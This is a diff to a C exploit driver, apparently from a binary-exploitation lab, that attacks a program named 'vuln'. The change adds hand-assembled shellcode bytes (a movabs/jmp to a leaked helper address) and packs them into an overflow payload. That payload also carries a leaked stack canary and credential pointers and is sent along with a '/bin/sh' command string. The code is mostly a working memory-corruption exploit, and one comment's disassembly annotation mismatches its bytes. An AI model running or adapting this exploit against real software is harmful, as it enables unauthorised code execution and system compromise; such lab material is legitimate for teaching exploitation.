@@ -1,5 +1,7 @@
 #include "driver_base.c"
 
+
+
 int main() {
     char *nargv[3];
     nargv[0] = "vuln";
@@ -59,7 +61,7 @@ int main() {
             cur_auth_bp, cur_auth_cred_loc, curr_auth_cred, curr_private_helper_addr);
 
     // Now, send the payload
-    put_str("p /bin/sh\n\0");
+    put_str("p /bin/sh\0\n\0");
     send();
     get_formatted("%*s");
 
@@ -72,7 +74,31 @@ int main() {
     expl[explsz/sizeof(void*)-3] = (void*)stack_canary; // canary
     expl[explsz/sizeof(void*)-4] = (void*)curr_auth_cred; // cred
     expl[explsz/sizeof(void*)-5] = (void*)cur_auth_cred_loc; // db
-    expl[1] = (void*)0xdeadbeef;
+
+
+    int injected_code_length_in_bytes = 16;
+    uint64_t injected_code[injected_code_length_in_bytes] = {
+        0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+        0x00, 0x00, 0xff, 0xe0, 0x90, 0x90, 0x90, 0x90
+    };
+
+
+    for (int i = 0; i < 8; ++i) {
+        uint8_t byte = (curr_private_helper_addr >> (i * 8)) & 0xFF;
+        injected_code[9-i] = byte;
+    }
+
+    int curr_expl_location = 0;
+    int shift_bytes;
+    for(int i = 0; i < injected_code_length_in_bytes; i++) {
+        if(i % 8 == 0) {
+            curr_expl_location++;
+            expl[curr_expl_location] = 0x0000000000000000;
+            shift_bytes = 7;
+        }
+        expl[curr_expl_location] += injected_code[i] << (shift_bytes*8);
+        shift_bytes--;
+    }
 
     put_str("u ");
     put_bin((char*)expl, explsz);
@@ -119,13 +145,13 @@ int main() {
   401011:	56 34 12 
   401014:	48 ba 00 e0 ff ff ff 	movabs $0x7fffffffe000,%rdx
   40101b:	7f 00 00 
-  40101e:	b8 ef be ad de       	mov    $0xdeadbeef,%eax
+  40101e:	48 b8 ef be ad de ef be ad de       	mov    $0xdeadbeef,%eax
   401023:	ff e0                	jmpq   *%rax
 
 
 
-        bf7056341248bef0debc9a78
-
+        48 b8 a6 8f 3b dd 66 55 
+        00 00 ff e0
       */
 
 }
